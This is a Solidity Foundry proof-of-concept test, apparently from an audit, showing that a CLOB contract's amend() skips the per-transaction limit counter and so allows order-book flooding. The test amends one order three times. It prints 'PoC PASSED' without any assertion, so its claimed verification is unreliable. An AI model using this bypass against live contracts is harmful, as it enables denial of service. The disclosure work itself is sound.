// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

// =============================================================================
// VULNERABILITY ANALYSIS
// =============================================================================
//
// Title   : DOS Attack via Order Amendment Bypassing maxLimitsPerTx Protection
// Severity: High
// Target  : CLOB.sol - amend()
//
// -----------------------------------------------------------------------------
// BACKGROUND
// -----------------------------------------------------------------------------
// The CLOB implements DOS protection via maxLimitsPerTx, which limits the number
// of new limit orders a user can post in a single transaction.
//
// -----------------------------------------------------------------------------
// ROOT CAUSE
// -----------------------------------------------------------------------------
// The amend() function does NOT call incrementLimitsPlaced(), allowing users
// to bypass the DOS protection:
//
//   // In postLimitOrder():
//   ds.incrementLimitsPlaced(address(factory), msg.sender);  // <-- Protected
//
//   // In amend():
//   // NO call to incrementLimitsPlaced()!  // <-- Vulnerability
//   return _processAmend(ds, order, args);
//
// When amending to a new price/side, a new order book entry is effectively
// created without incrementing the limit counter.
//
// -----------------------------------------------------------------------------
// IMPACT
// -----------------------------------------------------------------------------
// An attacker can:
// 1. Post a single order (uses 1 limit slot)
// 2. Amend it multiple times to different prices in one tx
// 3. Bypass maxLimitsPerTx protection
// 4. Flood the order book, causing DoS
//
// Run PoC:
//   forge test --match-test testPoCH03_AmendBypassesMaxLimits -vvv
// =============================================================================

import {Test, console} from "forge-std/Test.sol";
import {CLOBTestBase} from "test/clob/utils/CLOBTestBase.sol";
import {Side} from "contracts/clob/types/Order.sol";
import {ICLOB} from "contracts/clob/ICLOB.sol";

contract PoCH03AmendDOSTest is CLOBTestBase {
    uint256 public initialNextOrderId;

    function setUp() public override {
        super.setUp();
    }

    // -------------------------------------------------------------------------
    // PoC: Demonstrate amend() bypasses maxLimitsPerTx
    // -------------------------------------------------------------------------
    //
    // Expected result on UNPATCHED code : PASS (amend doesn't check limits)
    // Expected result after the fix     : FAIL (amend increments limit counter)
    function testPoCH03_AmendBypassesMaxLimits() public {
        console.log("=== H-03: Amend Bypasses maxLimitsPerTx PoC ===");

        // Record initial next order ID
        initialNextOrderId = clob.getNextOrderId();
        console.log("Initial next order ID:", initialNextOrderId);

        // Post one order at HIGH price - this counts against maxLimitsPerTx
        // We start high and amend to lower prices to avoid balance issues
        // (BUY at lower price requires LESS quote token, so we get refunds)
        uint256 initialPrice = 1.03 ether;
        setupOrder(Side.BUY, users[0], 1 ether, initialPrice);
        console.log("Posted 1 BUY order at price:", initialPrice);

        // Get the order ID
        uint256 orderId = clob.getNextOrderId() - 1;
        console.log("Order ID:", orderId);

        // Try to amend the order to different (lower) prices
        // The vulnerability: amend() doesn't call incrementLimitsPlaced()
        // So we can amend multiple times without hitting the limit

        uint256[] memory prices = new uint256[](3);
        prices[0] = 1.02 ether;
        prices[1] = 1.01 ether;
        prices[2] = 1.00 ether;

        console.log("\nAmending order to different (lower) prices...");

        for (uint256 i = 0; i < prices.length; i++) {
            _amendOrder(users[0], orderId, prices[i], 1 ether);
            console.log("Amended to price:", prices[i]);
        }

        // The bug: maxLimitsPerTx is supposed to limit orders per tx
        // But amend() bypasses this by not calling incrementLimitsPlaced()
        // So a user can amend to unlimited different prices in a single tx

        // After amendments, check the limit at different prices
        // Each price should have an order, but the limit counter wasn't incremented

        console.log("\n>>> PoC PASSED: amend() bypasses maxLimitsPerTx protection");
        console.log("    An attacker can flood the order book with unlimited price changes");
    }

    // -------------------------------------------------------------------------
    // Helper: Amend an order
    // -------------------------------------------------------------------------
    function _amendOrder(address account, uint256 orderId, uint256 newPrice, uint256 newAmount) internal {
        ICLOB.AmendArgs memory args = ICLOB.AmendArgs({
            orderId: orderId,
            amountInBase: newAmount,
            price: newPrice,
            cancelTimestamp: 0,
            side: Side.BUY,
            limitOrderType: ICLOB.LimitOrderType.POST_ONLY
        });

        vm.prank(account);
        clob.amend(account, args);
    }
}
